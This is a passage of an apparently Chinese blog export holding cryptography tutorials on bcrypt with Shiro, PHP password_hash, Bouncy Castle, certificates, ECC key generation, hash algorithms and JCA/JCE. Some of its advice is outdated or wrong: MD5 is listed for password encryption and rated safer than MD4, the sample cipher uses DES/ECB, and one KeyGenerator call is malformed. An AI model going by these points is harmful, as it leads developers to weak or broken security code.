<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;at.favre.lib&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;bcrypt&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;0.8.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>hash方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String pwd=&quot;ceshi123&quot;;</span><br><span class="line">String hash = BCrypt.with(BCrypt.Version.VERSION_2Y).hashToString(5, pwd.toCharArray());</span><br><span class="line">System.out.println(hash);</span><br><span class="line">String h102y = BCrypt.with(BCrypt.Version.VERSION_2Y).hashToString(10, pwd.toCharArray());</span><br><span class="line">System.out.println(h102y);</span><br></pre></td></tr></table></figure>

<p>这里注意一下，每次的hash结果不一样。</p>
<p>因为结果里包含了version和cost等，验证时要用BCrypt指定的验证方法，不能直接比hash结果。</p>
<p>验证方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String hash=&quot;$2y$10$ozLf.I8c6WnqJ.3hSPhn7OGYALCRi9pWv0cFgQeLPlbk08OZn.DfO&quot;;</span><br><span class="line">String pwd=&quot;ceshi123&quot;;</span><br><span class="line">BCrypt.Result res = BCrypt.verifyer().verify(pwd.toCharArray(), hash);</span><br><span class="line">System.out.println(res.verified);</span><br></pre></td></tr></table></figure>

<h2 id="shiro登录验证"><a href="#shiro登录验证" class="headerlink" title="shiro登录验证"></a>shiro登录验证</h2><p>首先要把用户信息查出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;</span><br><span class="line">    String userLoginName= (String) token.getPrincipal();</span><br><span class="line">    UserEntity user = userDao.queryShopUserByLoginName(userLoginName);</span><br><span class="line">    if(user == null)&#123;</span><br><span class="line">    	log.info(&quot;商家登录失败，username:&quot;+userLoginName);</span><br><span class="line">        throw new AuthenticationException(&quot;帐号密码错误&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    SimpleAuthenticationInfo sainfo=new SimpleAuthenticationInfo(user,user.getPassWord(), getName());</span><br><span class="line">    return sainfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>验证密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected void assertCredentialsMatch(AuthenticationToken authcToken,</span><br><span class="line">                                      AuthenticationInfo info) throws AuthenticationException &#123;</span><br><span class="line">	UserEntity user=(UserEntity) info.getPrincipals().getPrimaryPrincipal();</span><br><span class="line">	UsernamePasswordToken token=(UsernamePasswordToken) authcToken;</span><br><span class="line">	BCrypt.Result res = BCrypt.verifyer().verify(token.getPassword(), user.getPassWord());</span><br><span class="line">	if(res.verified)&#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	String msg = &quot;Submitted credentials for token [&quot; + token + &quot;] did not match the expected credentials.&quot;;</span><br><span class="line">  throw new IncorrectCredentialsException(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里验证通过直接返回，没有验证通过要抛出异常。</p>
<h2 id="password-hash"><a href="#password-hash" class="headerlink" title="password_hash"></a>password_hash</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string password_hash ( string $password , integer $algo [, array $options ])</span><br></pre></td></tr></table></figure>

<p>它有三个参数：密码、哈希算法、选项。前两项为必须的。 让我们使用password_hash()简单的创建一个哈希密码： 复制代码 代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pwd = &quot;123456&quot;;</span><br><span class="line">$hash = password_hash($pwd, PASSWORD_DEFAULT);</span><br><span class="line">echo $hash;</span><br></pre></td></tr></table></figure>

<p>上例输出结果类似：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$2y$10$4kAu4FNGuolmRmSSHgKEMe3DbG5pm3diikFkiAKNh.Sf1tPbB4uo2</span><br></pre></td></tr></table></figure>

<p>并且刷新页面该哈希值也会不断的变化。</p>
<p>这里便有了一个疑问，同样的值同意的算法不同的值如何验证如何实现。 上述的方法支持三种算法</p>
<p>PASSWORD_DEFAULT - 使用 bcrypt 算法 (PHP 5.5.0 默认)。 注意，该常量会随着 PHP 加入更新更高强度的算法而改变。所以，使用此常量生成结果的长度将在未来有变化。 因此，数据库里储存结果的列可超过60个字符（最好是255个字符）。</p>
<p>PASSWORD_BCRYPT - 使用 CRYPT_BLOWFISH 算法创建散列。 这会产生兼容使用 “$2y$” 的 crypt()。 结果将会是 60 个字符的字符串， 或者在失败时返回 FALSE。</p>
<p>PASSWORD_ARGON2I - 使用 Argon2 散列算法创建散列。</p>
<p>PASSWORD_BCRYPT 支持的选项：</p>
<p>salt(string) - 手动提供散列密码的盐值（salt）。这将避免自动生成盐值（salt）。 省略此值后，password_hash() 为每个密码散列自动生成随机的盐值。</p>
<p>盐值（salt）选项从 PHP 7.0.0 开始被废弃（deprecated）了。 现在最好选择简单的使用默认产生的盐值。</p>
<p>cost (integer) - 代表算法使用的 cost。crypt() 页面上有 cost 值的例子。 省略时，默认值是 10。这个 cost个不错的底线，但也许可以根据自己硬件的情况，加大这个值。</p>
<p>我要处理的密码是 因为 password_hash 使用的是 crypt 算法, 因此参与计算 hash值的:</p>
<p>算法(就像身份证开头能知道省份一样, 由盐值的格式决定), cost(默认10) 和 盐值 是在$hash中可以直接看出来的!</p>
<p>所以说, Laravel 中bcrypt的盐值是PHP自动随机生成的字符, 虽然同一个密码每次计算的hash不一样.</p>
<p>但是通过 $hash 和 密码, 却可以验证密码的正确性!</p>
<p>具体来说, 比如这个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$hash = password_hash(&#x27;password&#x27;,PASSWORD_BCRYPT,[&#x27;cost&#x27; =&gt; 10]);</span><br><span class="line">echo $hash;</span><br><span class="line">// 比如我这次算的是</span><br><span class="line">// $hash = &#x27;$2y$10$DyAJOutGjURG9xyKgAaCtOm4K1yezvgNkxHf6PhuLYBCENk61bePm&#x27;;</span><br></pre></td></tr></table></figure>

<p>那么我们从这个 crypt的hash值中可以看到, 因为以$2y$开头, 所以它的算法是 CRYPT_BLOWFISH .</p>
<p>同时 CRYPT_BLOWFISH 算法盐值格式规定是 :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以$2y$开头 + 一个两位cost参数 + $ + 22位随机字符(&quot;./0-9A-Za-z&quot;)</span><br><span class="line"> </span><br><span class="line">$hash(CRYPT_BLOWFISH是固定60位) = 盐值 + 31位单向加密后的值</span><br><span class="line">参见: https://secure.php.net/manual/en/function.crypt.php</span><br><span class="line"> </span><br><span class="line">验证密码</span><br><span class="line"> </span><br><span class="line">if (password_verify(&#x27;password&#x27;, $hash)) &#123;</span><br><span class="line">    echo &#x27;密码正确.&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;密码错误!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// 原理是: </span><br><span class="line"> </span><br><span class="line">if ($hash === crypt(&#x27;password&#x27;, &#x27;$2y$10$DyAJOutGjURG9xyKgAaCtO&#x27;)) &#123;</span><br><span class="line">    echo &#x27;密码正确.&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;密码错误!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>架构</category>
        <category>组件</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】bouncycastle 轻量级密码术包</title>
    <url>/blog/arch/crypto/bouncycastle/</url>
    <content><![CDATA[<p><a href="http://www.bouncycastle.org/">bouncycastle官网</a></p>
<p>bouncy castle（轻量级密码术包）是一种用于 Java 平台的开放源码的轻量级密码术包；它支持大量的密码术算法，并提供JCE 1.2.1的实现。</p>
<p>用他主要是支持国密SM2的密码术，支持椭圆加密算法(ECC)。</p>
<p>API接口由以下组成：</p>
<p>A lightweight cryptography API for Java and C#.</p>
<p>A provider for the Java Cryptography Extension (JCE) and the Java Cryptography Architecture (JCA).</p>
<p>A provider for the Java Secure Socket Extension (JSSE).</p>
<p>A clean room implementation of the JCE 1.2.1.</p>
<p>A library for reading and writing encoded ASN.1 objects.</p>
<p>Lightweight APIs for TLS (RFC 2246, RFC 4346) and DTLS (RFC 6347&#x2F; RFC 4347).</p>
<p>Generators for Version 1 and Version 3 X.509 certificates, Version 2 CRLs, and PKCS12 files.</p>
<p>Generators for Version 2 X.509 attribute certificates.</p>
<p>Generators&#x2F;Processors for S&#x2F;MIME and CMS (PKCS7&#x2F;RFC 3852).</p>
<p>Generators&#x2F;Processors for OCSP (RFC 2560).</p>
<p>Generators&#x2F;Processors for TSP (RFC 3161 &amp; RFC 5544).</p>
<p>Generators&#x2F;Processors for CMP and CRMF (RFC 4210 &amp; RFC 4211).</p>
<p>Generators&#x2F;Processors for OpenPGP (RFC 4880).</p>
<p>Generators&#x2F;Processors for Extended Access Control (EAC).</p>
<p>Generators&#x2F;Processors for Data Validation and Certification Server (DVCS) - RFC 3029.</p>
<p>Generators&#x2F;Processors for DNS-based Authentication of Named Entities (DANE).</p>
<p>Generators&#x2F;Processors for RFC 7030 Enrollment over Secure Transport (EST).</p>
<p>A signed jar version suitable for JDK 1.4-1.7 and the Sun JCE.</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
      </tags>
  </entry>
  <entry>
    <title>数字证书的原理</title>
    <url>/blog/arch/crypto/cert/</url>
    <content><![CDATA[<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>证书实际上就是对公钥进行数字签名，它是对公钥合法性提供证明的技术。</p>
<p>考虑这样一种场景：我们对签名进行验证时，需要用到公钥。如果公钥也是伪造的，那怎么办？</p>
<p>如果公钥是假的，验证数字签名那就无从谈起，根本不可能从数字签名确定对方的合法性。</p>
<p>这时候证书就派上用场了。</p>
<p>证书一般包含：公钥（记住证书中是带有公钥的），公钥的数字签名，公钥拥有者的信息<br>若证书验证成功，这表示该公钥是合法，可信的。</p>
<p>接下来又有问题了：验证证书中的数字签名需要另一个公钥，那么这个公钥的合法性又该如何保证？该问题可以无限循环下去，岂不是到不了头了？这已经是个社会学问题了。</p>
<p>我们为什么把钱存进银行？因为我们相信银行，它是一个可信的机构（虽然也有破产的风险）。跟银行一样，我们需要一个可信的机构来颁发证书和提供公钥，只要是它提供的公钥，我们就相信是合法的。</p>
<p>这种机构称为认证机构(Certification Authority， CA)。CA就是能够认定”公钥确实属于此人”，并能生成公钥的数字签名的组织或机构。CA有国际性组织和政府设立的组织，也有通过提供认证服务来盈利的组织。</p>
<h2 id="如何生成证书？"><a href="#如何生成证书？" class="headerlink" title="如何生成证书？"></a>如何生成证书？</h2><ol>
<li>服务器将公钥A给CA（公钥是服务器的）</li>
<li>CA用自己的私钥B给公钥A加密，生成数字签名A</li>
<li>CA把公钥A，数字签名A，附加一些服务器信息整合在一起，生成证书，发回给服务器。</li>
</ol>
<p>注：私钥B是用于加密公钥A的，私钥B和公钥A并不是配对的。</p>
<h2 id="如何验证证书？"><a href="#如何验证证书？" class="headerlink" title="如何验证证书？"></a>如何验证证书？</h2><ol>
<li>客户端得到证书</li>
<li>客户端得到证书的公钥B（通过CA或其它途径）</li>
<li>客户端用公钥B对证书中的数字签名解密，得到哈希值</li>
<li>客户端对公钥进行哈希值计算</li>
<li>两个哈希值对比，如果相同，则证书合法。</li>
</ol>
<p>注：公钥B和上述的私钥B是配对的，分别用于对证书的验证（解密）和生成（加密）。</p>
<h2 id="证书作废"><a href="#证书作废" class="headerlink" title="证书作废"></a>证书作废</h2><p>当用户私钥丢失、被盗时，认证机构需要对证书进行作废(revoke)。要作废证书，认证机构需要制作一张证书作废清单(Certificate Revocation List)，简称CRL</p>
<p>假设我们有Bob的证书，该证书有合法的认证机构签名，而且在有效期内，但仅凭这些还不能说明该证书一定有效，还需要查询认证机构最新的CRL，并确认该证书是否有效。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>下面用两个使用场景来帮助大家理解证书的作用。</p>
<p>客户端在发送或接收消息之前，要验证服务器的合法性(这个服务器是真实的服务器，还是伪造者，我们不知道)</p>
<p>场景1</p>
<ol>
<li>服务器生成公钥和私钥密码对</li>
<li>服务器把公钥给CA。CA生成证书，发送给客户端</li>
<li>客户端验证证书，取得公钥：此刻证明公钥是合法的</li>
<li>客户端用公钥加密消息，发送给服务器</li>
<li>服务器用私钥解密消息（消息加密发送，具有保密性）</li>
</ol>
<p>场景2</p>
<ol>
<li>服务器生成公钥和私钥密码对</li>
<li>服务器生成消息，用私钥对消息进行数字签名</li>
<li>服务器把公钥给CA。CA生成证书</li>
<li>服务器将消息，数字签名，证书一起发送给客户端</li>
<li>客户端验证证书，取得公钥：此刻证明公钥是合法的</li>
<li>客户端用公钥验证数字签名，检查消息的完整性和服务器的合法性</li>
</ol>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>数字证书</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】ECC椭圆曲线密钥对生成</title>
    <url>/blog/arch/crypto/ecckey/</url>
    <content><![CDATA[<p>这里用的是bouncy castle（轻量级密码术包）是一种用于 Java 平台的开放源码的轻量级密码术包。</p>
<p>这里先给出一些数学上的定义名词，因为代码中会有对应的变量名。</p>
<h4 id="六个参量"><a href="#六个参量" class="headerlink" title="六个参量"></a>六个参量</h4><p>有限域Fp，这个域只有有限个元素。</p>
<p>Fp中只有p（p为素数）个元素0,1,2 …… p-2,p-1；<br>Fp 的加法（a+b）法则是 a+b≡c (mod p)；<br>Fp 的乘法(a×b)法则是  a×b≡c (mod p)；<br>Fp 的除法(a÷b)法则是  a&#x2F;b≡c (mod p)；</p>
<p>密码学中，描述Fp上的一条椭圆曲线，常用到六个参量：</p>
<p>T&#x3D;(p,a,b,G,n,h)。</p>
<p>p 、a 、b 用来确定Fp上的一条椭圆曲线，G为基点，n为点G的阶，h 是椭圆曲线上所有点的个数m与n相除的整数部分。</p>
<h3 id="G点"><a href="#G点" class="headerlink" title="G点"></a>G点</h3><p>如果椭圆曲线上一点P，存在最小的正整数n，使得数乘nP&#x3D;O∞，则将n称为P的阶，在有限域上定义的椭圆曲线上所有的点的阶n都是存在的。</p>
<p>K&#x3D;kG  [其中 K,G为Ep(a,b)上的点，k为小于n（n是点G的阶）的整数]</p>
<p>不难发现，给定k和G，根据加法法则，计算K很容易；但给定K和G，求k就相对困难了。</p>
<p>这就是椭圆曲线加密算法采用的难题。我们把点G称为基点（base point）。</p>
<p>其中小k为私钥，一般为一个大随机数。</p>
<p>K为公钥，因为是个坐标点，所以有非压缩方式和压缩方式，压缩方式就是取x坐标，y在用时再计算出来。</p>
<h3 id="创建曲线"><a href="#创建曲线" class="headerlink" title="创建曲线"></a>创建曲线</h3><p>首先要获取一个曲线参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static X9ECParameters CURVE_PARAMS = CustomNamedCurves.getByName(&quot;secp256k1&quot;);</span><br></pre></td></tr></table></figure>

<p>有很多内置参数，只要调用名称就可以了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineCurve(&quot;curve25519&quot;, curve25519);</span><br><span class="line"></span><br><span class="line">defineCurveWithOID(&quot;secp192k1&quot;, SECObjectIdentifiers.secp192k1, secp192k1);</span><br><span class="line">defineCurveWithOID(&quot;secp192r1&quot;, SECObjectIdentifiers.secp192r1, secp192r1);</span><br><span class="line">defineCurveWithOID(&quot;secp224k1&quot;, SECObjectIdentifiers.secp224k1, secp224k1);</span><br><span class="line">defineCurveWithOID(&quot;secp224r1&quot;, SECObjectIdentifiers.secp224r1, secp224r1);</span><br><span class="line">defineCurveWithOID(&quot;secp256k1&quot;, SECObjectIdentifiers.secp256k1, secp256k1);</span><br><span class="line">defineCurveWithOID(&quot;secp256r1&quot;, SECObjectIdentifiers.secp256r1, secp256r1);</span><br><span class="line">defineCurveWithOID(&quot;secp384r1&quot;, SECObjectIdentifiers.secp384r1, secp384r1);</span><br><span class="line">defineCurveWithOID(&quot;secp521r1&quot;, SECObjectIdentifiers.secp521r1, secp521r1);</span><br><span class="line"></span><br><span class="line">defineCurveAlias(&quot;P-192&quot;, SECObjectIdentifiers.secp192r1);</span><br><span class="line">defineCurveAlias(&quot;P-224&quot;, SECObjectIdentifiers.secp224r1);</span><br><span class="line">defineCurveAlias(&quot;P-256&quot;, SECObjectIdentifiers.secp256r1);</span><br><span class="line">defineCurveAlias(&quot;P-384&quot;, SECObjectIdentifiers.secp384r1);</span><br><span class="line">defineCurveAlias(&quot;P-521&quot;, SECObjectIdentifiers.secp521r1);</span><br></pre></td></tr></table></figure>

<p>再创建Fp上的一条椭圆曲线对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static ECDomainParameters CURVE = new ECDomainParameters(CURVE_PARAMS.getCurve(), CURVE_PARAMS.getG(),</span><br><span class="line">			CURVE_PARAMS.getN(), CURVE_PARAMS.getH());</span><br></pre></td></tr></table></figure>

<p>如果想用自己的参数创建一条可以这样做：</p>
<p>设置好六个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public BigInteger p;</span><br><span class="line">public BigInteger a;</span><br><span class="line">public BigInteger b;</span><br><span class="line">public BigInteger n;</span><br><span class="line">public BigInteger gx;</span><br><span class="line">public BigInteger gy;</span><br></pre></td></tr></table></figure>
<p>用如下代码创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECCurve fp = new ECCurve.Fp(p, a, b);</span><br><span class="line">ECPoint g = fp.createPoint(gx, gy);</span><br><span class="line">ECDomainParameters curve = new ECDomainParameters(fp, g, n);</span><br></pre></td></tr></table></figure>

<h3 id="随机生成密钥"><a href="#随机生成密钥" class="headerlink" title="随机生成密钥"></a>随机生成密钥</h3><p>首先要创建一个密钥生成器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECKeyGenerationParameters genparam = new ECKeyGenerationParameters(this.ecc_bc_spec, new SecureRandom());</span><br><span class="line">ecKeyPairGenerator = new ECKeyPairGenerator();</span><br><span class="line">ecKeyPairGenerator.init(genparam);</span><br></pre></td></tr></table></figure>

<p>生成密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AsymmetricCipherKeyPair keyPair = this.ecKeyPairGenerator.generateKeyPair();</span><br><span class="line">ECPrivateKeyParameters priKey = (ECPrivateKeyParameters) keyPair.getPrivate();</span><br><span class="line">ECPublicKeyParameters pubKey = (ECPublicKeyParameters) keyPair.getPublic();</span><br><span class="line"></span><br><span class="line">BigInteger priv = priKey.getD();</span><br><span class="line">ECPoint point = pubKey.getQ().normalize();</span><br><span class="line">BigInteger pubx = point.getXCoord().toBigInteger();</span><br><span class="line">BigInteger puby = point.getYCoord().toBigInteger();</span><br></pre></td></tr></table></figure>

<p>这里priv为私钥，pubx和puby为公钥，可以编码成字符串保存。</p>
<h3 id="密钥生成过程"><a href="#密钥生成过程" class="headerlink" title="密钥生成过程"></a>密钥生成过程</h3><p>下面是<code>generateKeyPair</code>的源码，可以看出私钥是随机生成一个不大于n的随机数，公钥是私钥和曲线上的G点相乘得到的点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public AsymmetricCipherKeyPair generateKeyPair()</span><br><span class="line">&#123;</span><br><span class="line">    BigInteger n = params.getN();</span><br><span class="line">    int nBitLength = n.bitLength();</span><br><span class="line">    int minWeight = nBitLength &gt;&gt;&gt; 2;</span><br><span class="line"></span><br><span class="line">    BigInteger d;</span><br><span class="line">    for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        d = new BigInteger(nBitLength, random);</span><br><span class="line"></span><br><span class="line">        if (d.compareTo(TWO) &lt; 0  || (d.compareTo(n) &gt;= 0))</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (WNafUtil.getNafWeight(d) &lt; minWeight)</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ECPoint Q = createBasePointMultiplier().multiply(params.getG(), d);</span><br><span class="line"></span><br><span class="line">    return new AsymmetricCipherKeyPair(</span><br><span class="line">        new ECPublicKeyParameters(Q, params),</span><br><span class="line">        new ECPrivateKeyParameters(d, params));</span><br><span class="line">&#125;</span><br><span class="line">protected ECMultiplier createBasePointMultiplier()</span><br><span class="line">&#123;</span><br><span class="line">    return new FixedPointCombMultiplier();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用私钥求公钥是非常简单的，只要做个multiply就可以了。</p>
<h3 id="用种子生成密钥对"><a href="#用种子生成密钥对" class="headerlink" title="用种子生成密钥对"></a>用种子生成密钥对</h3><p>私钥可以用一个字符串加工得到byte数组，再由数组构建BigInteger，这样的私钥是伪随机的，但容易记，因为有种子就可以再次生成。</p>
<p>请参考比特币bip32协议。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
      </tags>
  </entry>
  <entry>
    <title>摘要（Hash）算法</title>
    <url>/blog/arch/crypto/hash/</url>
    <content><![CDATA[<p>消息摘要算法的主要特征是加密过程不需要密钥，并且经过加密的数据无法被解密，只有输入相同的明文数据经过相同的消息摘要算法才能得到相同的密文。</p>
<p>消息摘要算法不存在密钥的管理与分发问题，适合于分布式网络上使用。</p>
<p>数据摘要算法具有不可逆性, 其主要功能有数据签名, 数据完整性校验等. 下面介绍常见的数据摘要算法:</p>
<h2 id="CRC8、CRC16、CRC32"><a href="#CRC8、CRC16、CRC32" class="headerlink" title="CRC8、CRC16、CRC32"></a>CRC8、CRC16、CRC32</h2><p>CRC（Cyclic Redundancy Check，循环冗余校验）算法出现时间较长，应用广泛，尤其是通讯领域；</p>
<p>它产生一个4字节（32位）的校验值，一般是以8位十六进制数，如FA 12 CD 45等。</p>
<p>CRC算法的优点在于简便、速度快，严格的来说，CRC更应该被称为数据校验算法，但其功能与数据摘要算法类似，因此也作为测试的可选算法。</p>
<h2 id="MD2-、MD4、MD5"><a href="#MD2-、MD4、MD5" class="headerlink" title="MD2 、MD4、MD5"></a>MD2 、MD4、MD5</h2><p>Message-Digest Algorithm</p>
<p>创建者：Ron Rivest（RSA公司）在1992年提出；<br>长度：16Byte （128bit），一般用32位16进制数据表示；<br>用途：数据完整性校验、数据摘要、数据加密；</p>
<p> 性能：<br> MD2：  速度慢－安全性高<br> MD4:   速度很快－安全性下降<br> MD5:   比MD4更快更安全</p>
<p> 使用场景：<br> 网络数据大文件传输－数据完整性校验<br> 计算机系统－用户密码加密</p>
<h2 id="SHA1、SHA256、SHA384、SHA512"><a href="#SHA1、SHA256、SHA384、SHA512" class="headerlink" title="SHA1、SHA256、SHA384、SHA512"></a>SHA1、SHA256、SHA384、SHA512</h2><p>标准制订者：SHA（Secure Hash Algorithm）美国国家标准技术研究院（NIST）制定；</p>
<p>算法：SHA1、SHA256、SHA512<br>速度：相对MD5-较慢－更安全</p>
<p>目前SHA1的应用较为广泛，主要应用于CA和数字证书中，另外在目前互联网中流行的BT软件中，也是使用SHA1来进行文件校验的。</p>
<h2 id="RIPEMD、PANAMA、TIGER、ADLER32-等"><a href="#RIPEMD、PANAMA、TIGER、ADLER32-等" class="headerlink" title="RIPEMD、PANAMA、TIGER、ADLER32 等"></a>RIPEMD、PANAMA、TIGER、ADLER32 等</h2><p>RIPEMD是Hans Dobbertin等3人在对MD4，MD5缺陷分析基础上，于1996年提出来的，有4个标准128、160、256和320，其对应输出长度分别为16字节、20字节、32字节和40字节。</p>
<p>TIGER由Ross在1995年提出。Tiger号称是最快的Hash算法，专门为64位机器做了优化。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>摘要算法</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】SHA256的JAVA示例</title>
    <url>/blog/arch/crypto/javasha256/</url>
    <content><![CDATA[<p>java本身支持很多加密术，SHA256就是其中之一，下面是下示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static byte[] sha256(String input) &#123;</span><br><span class="line">	return hash(input.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static byte[] hash(byte[] input) &#123;</span><br><span class="line">	return hash(input, 0, input.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static byte[] hash(byte[] input, int offset, int length) &#123;</span><br><span class="line">	MessageDigest digest = newDigest();</span><br><span class="line">	digest.update(input, offset, length);</span><br><span class="line">	return digest.digest();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static MessageDigest newDigest() &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		return MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br><span class="line">	&#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class="line">		throw new RuntimeException(e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】JAVA安全体系JCA和JCE介绍</title>
    <url>/blog/arch/crypto/jcajce/</url>
    <content><![CDATA[<h3 id="JCE和JCA"><a href="#JCE和JCA" class="headerlink" title="JCE和JCA"></a>JCE和JCA</h3><p>JCE(Java Cryptography Extension)，在早期JDK版本中，由于受美国的密码出口条例约束，Java中涉及加解密功能的API被限制出口，所以Java中安全组件被分成了两部分: 不含加密功能的JCA（Java Cryptography Architecture ）和含加密功能的JCE（Java Cryptography Extension）。</p>
<p>在JDK1.1-1.3版本期间，JCE属于扩展包，仅供美国和加拿大的用户下载，JDK1.4+版本后，随JDK核心包一起分发。</p>
<p>JCE的API都在javax.crypto包下，核心功能包括：加解密、密钥生成（对称）、MAC生成、密钥协商，下面我们就详细介绍下这些功能。</p>
<h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><p>加解密功能由Cipher组件提供，其也是JCE中最核心的组件。</p>
<p>Cipher的几个知识点：</p>
<ol>
<li>Cipher在使用时需以参数方式指定transformation</li>
<li>transformation的格式为algorithm&#x2F;mode&#x2F;padding，其中algorithm为必输项，如: DES&#x2F;CBC&#x2F;PKCS5Padding</li>
<li>缺省的mode为ECB，缺省的padding为PKCS5Padding</li>
<li>在block算法与流加密模式组合时, 需在mode后面指定每次处理的bit数, 如DES&#x2F;CFB8&#x2F;NoPadding, 如未指定则使用缺省值, SunJCE缺省值为64bits</li>
<li>Cipher有4种操作模式: ENCRYPT_MODE(加密), DECRYPT_MODE(解密), WRAP_MODE(导出Key), UNWRAP_MODE(导入Key)，初始化时需指定某种操作模式</li>
</ol>
<p>一般情况下，不要选择DES算法，推荐使用AES算法。一般认为128bits的密钥已足够安全，如果可以请选择256bits的密钥。</p>
<p>密钥长度是在生成密钥时指定的，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KeyGenerator generator = KeyGenerator.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);</span><br><span class="line">generator.init(256);</span><br><span class="line">SecretKey key = generator.generateKey();</span><br></pre></td></tr></table></figure>

<p>加解密示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static final String encrypt(String plainText) &#123;</span><br><span class="line">	Key secretKey = getKey();</span><br><span class="line">	try &#123;</span><br><span class="line">		Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);</span><br><span class="line">		cipher.init(Cipher.ENCRYPT_MODE, secretKey);</span><br><span class="line">		byte[] p = plainText.getBytes(&quot;UTF-8&quot;);</span><br><span class="line">		byte[] result = cipher.doFinal(p);</span><br><span class="line">		BASE64Encoder encoder = new BASE64Encoder();</span><br><span class="line">		String encoded = encoder.encode(result);</span><br><span class="line">		return encoded;</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		throw new RuntimeException(e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static final String decrypt(String cipherText) &#123;</span><br><span class="line">	Key secretKey = getKey();</span><br><span class="line">	try &#123;</span><br><span class="line">		Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);</span><br><span class="line">		cipher.init(Cipher.DECRYPT_MODE, secretKey);</span><br><span class="line">		BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line">		byte[] c = decoder.decodeBuffer(cipherText);</span><br><span class="line">		byte[] result = cipher.doFinal(c);</span><br><span class="line">		String plainText = new String(result, &quot;UTF-8&quot;);</span><br><span class="line">		return plainText;</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		throw new RuntimeException(e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>非对称密钥的生成请参考java.security.KeyPairGenerator，样例代码请参考JCA中的示例，对称密钥生成的示例代码如下：</p>
